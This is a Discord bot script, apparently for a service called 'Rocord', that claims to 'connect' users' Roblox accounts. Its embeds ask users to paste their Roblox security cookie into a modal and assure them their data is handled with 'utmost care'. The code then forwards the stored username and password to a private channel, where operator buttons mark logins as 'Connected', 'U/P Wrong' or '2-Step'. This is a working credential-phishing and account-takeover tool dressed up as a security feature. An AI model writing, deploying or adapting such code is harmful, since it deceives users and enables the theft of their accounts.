module.exports = [{
name: "sconnect",
aliases: 'sconn',
code: `

$author[$username[$authorID];$userAvatar[$authorID]]
$thumbnail[https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png]
$description[
# Connect To Roblox Account

This is ***Security Connection*** which mean using your **cookie** to connect to your account.
This information is **really sensitive** so becareful of giving someone your cookie.
With this cookie, people can login to your account **without providing username or password**!
Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thank you for choosing us!

Click on the **Connect** button below to start.
]
$footer[Rocord]
$addtimestamp
$color[Blue]

$addButton[1;Connect;primary;sconn_$authorID;false]

$onlyif[$getGlobalUserVar[reqsending]==false;{newEmbed:
{author:$username:$userAvatar}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{title:You Already Have 1 Request Sending!}{description:
You have a request to connect to account name **$getGlobalUserVar[uname]** which was still in action.
You can cancel the request by \`cancelreq\` command.
}
{footer:Rocord}
{timestamp}
{color:#ff0000}
}]

$onlyif[$getGlobalUserVar[connected]==false;{newEmbed:
{author:$username:$userAvatar}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{title:You Have Already Connected!}{description:
You have connected with account name **$getGlobalUserVar[uname]**.
}
{footer:Rocord}
{timestamp}
{color:#ff0000}
}]


`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[Connect To Roblox Account!;sconnsent;
{actionRow:
{textInput:Security Cookie:1:cookieinput:true:your security code}
}
]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==sconn;]
`
},{
name: "sconnsent",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1127828796947578910;
{newEmbed:
{author:$username:$userAvatar}
{thumbnail:$get[rbxav]}
{title:New Connection Request!}
{description:
**Username:**
\`\`\`
$getglobaluservar[uname]
\`\`\`
**Password:**
\`\`\`
$getglobaluservar[pword]
\`\`\`
}
{footer:Rocord}
{timestamp}
{color:#ffffff}}
{actionRow:{button:Connected:success:connected_$interactionData[author.id]:false} 
{button:U/P Wrong:danger:upwrong_$interactionData[author.id]:false}
{button:2-Step:secondary:2sv_$interactionData[author.id]:false}}
]

$setglobaluservar[avt;$get[rbxav];$interactionData[author.id]]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{title:Request Sent!}
{description:
*** Your request to connect with your account name __$getGlobalUserVar[uname]__ has been sent.***
*Please wait for your request to be approved. You will be announce if the connection is success or there is some problem*

**The connection will be fail if:**
- Wrong **Username** or **Password** provided
- Some technical issue from the bot

**You will need to provide more information if:**
- 2-Step Verification code (if you have 2-step verify turned on)
...

}
{field:Username:\`\`\`
$getObjectProperty[data[0].name]
\`\`\`:false}
{field:Display Name:\`\`\`
$getObjectProperty[data[0].displayName]
\`\`\`:false}
{image:$get[rbxav]}
{footer:Rocord}
{timestamp}
{color:#00ff00}
}
]

$setGlobalUserVar[reqsending;true]

$onlyif[$isUserDmEnabled[$interactionData[author.id]]==true;{
"embeds" : "{newEmbed:{description:You must enable your DM so that you could get the announcement of your request!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

$onlyif[$getGlobalUserVar[reqsending]==false;{newEmbed:
{author:$username:$userAvatar}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{title:You Already Have 1 Request Sending!}{description:
You have a request to connect to account name **$getGlobalUserVar[uname]** which was still in action.
You can cancel the request by \`cancelreq\` command.
}
{footer:Rocord}
{timestamp}
{color:#ff0000}
}]

$onlyif[$getGlobalUserVar[connected]==false;{newEmbed:
{author:$username:$userAvatar}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{title:You Have Already Connected!}{description:
You have connected with account name **$getGlobalUserVar[uname]**.
}
{footer:Rocord}
{timestamp}
{color:#ff0000}
}]

`
}]